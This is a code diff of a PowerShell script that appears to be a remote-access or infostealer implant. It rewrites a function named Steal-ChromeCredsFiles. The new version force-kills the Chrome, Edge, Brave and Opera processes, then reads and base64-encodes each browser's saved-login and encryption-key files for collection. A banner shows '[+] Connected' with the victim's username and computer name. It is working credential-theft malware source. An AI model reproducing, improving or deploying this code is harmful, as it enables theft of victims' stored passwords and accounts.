@@ -392,34 +392,48 @@ function PortSuggest {
 
 
     function Steal-ChromeCredsFiles {
-        $browsers = @{
-            "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-            "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
-            "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
-            "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
-        }
-    
-        $result = ""
-    
-        foreach ($name in $browsers.Keys) {
-            $base = $browsers[$name]
-            $loginData = Join-Path $base "Login Data"
-            $localState = Join-Path (Split-Path $base -Parent) "Local State"
-    
-            if ((Test-Path $loginData) -and (Test-Path $localState)) {
+    # Сначала убиваем все браузеры
+    $browsersToKill = @("chrome", "msedge", "brave", "opera")
+
+    foreach ($proc in $browsersToKill) {
+        try {
+            Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
+        } catch {}
+    }
+
+    Start-Sleep -Seconds 2  # даём системе отпустить файлы
+
+    $browsers = @{
+        "Chrome" = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default"
+        "Edge"   = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default"
+        "Brave"  = "$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default"
+        "Opera"  = "$env:APPDATA\\Opera Software\\Opera Stable"
+    }
+
+    $result = ""
+
+    foreach ($name in $browsers.Keys) {
+        $base = $browsers[$name]
+        $loginData = Join-Path $base "Login Data"
+        $localState = Join-Path (Split-Path $base -Parent) "Local State"
+
+        if ((Test-Path $loginData) -and (Test-Path $localState)) {
+            try {
                 $loginB64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($loginData))
                 $stateB64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($localState))
-    
                 $result += "`n[$name]::LoginData::$loginB64::LocalState::$stateB64::END"
+            } catch {
+                $result += "`n[ERROR] Failed to steal from $name: $($_.Exception.Message)"
             }
         }
-    
-        if ($result) {
-            return $result
-        } else {
-            return "[ERROR] No browser credential files found"
-        }
     }
+
+    if ($result) {
+        return $result
+    } else {
+        return "[ERROR] No browser credential files found"
+    }
+}
 
 
     
@@ -638,7 +652,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST 10                                                                                                                                                                    
+                                            TEST 1022S                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
